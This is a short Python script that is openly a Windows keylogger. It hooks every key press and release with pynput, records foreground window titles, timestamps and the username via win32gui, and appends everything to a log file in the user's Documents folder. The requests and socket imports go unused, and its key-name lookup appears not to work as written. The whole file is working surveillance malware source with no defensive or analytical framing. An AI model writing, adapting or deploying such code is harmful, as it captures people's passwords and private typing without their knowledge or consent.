from pynput.keyboard import Key, Listener
import time
import os
import random
import requests
import socket
import win32gui

user = os.path.expanduser('~').split('\\')[2]
last_app = ''
key_names = {'Key.enter': '[ENTER]\n',
             'Key.backspace': '[BACKSPACE]',
             'Key.space': '[SPACE]',
             'Key.alt_l': '[ALT]',
             'Key.tab': '[TAB]',
             'Key.delete': '[DEL]',
             'Key.ctrl_l': '[CTRL]',
             'Key.left': '[LEFT ARROW]',
             'Key.right': '[RIGHT ARROW]',
             'Key.shift': '[SHIFT]',
             'Key.caps_lock': '[CAPS LK]',
             'Key.cmd': '[WINDOWS KEY]',
             'Key.print_screen': '[PRNT SCR]',}

def log_app_status():
    global last_app

    current_app = win32gui.GetWindowText(win32gui.GetForegroundWindow())

    if current_app != last_app and current_app != '':
        datetime = time.ctime(time.time())
        file.write('\n\n[{}:{}] ~ {}\n'.format(datetime, user, current_app))
        last_app = current_app

def on_press(key):
    log_app_status()

    if key in key_names:
        file.write(key_names[key] + " is pressed\n")
    else:
        file.write(str(key) + " is pressed\n")

def on_release(key):
    log_app_status()
    if key in key_names:
        file.write(key_names[key] + " is released\n")
    else:
        file.write(str(key) + " is released\n")
    if key == Key.space:
        file.close()
        exit()

file_path = os.path.expanduser('~') + "\\Documents\\Keylogger\\logs.txt"
directory = os.path.dirname(file_path)

if not os.path.exists(directory):
    os.makedirs(directory)

global file
file = open(file_path, "a")

with Listener(on_press = on_press, on_release = on_release) as listener:
    listener.join()
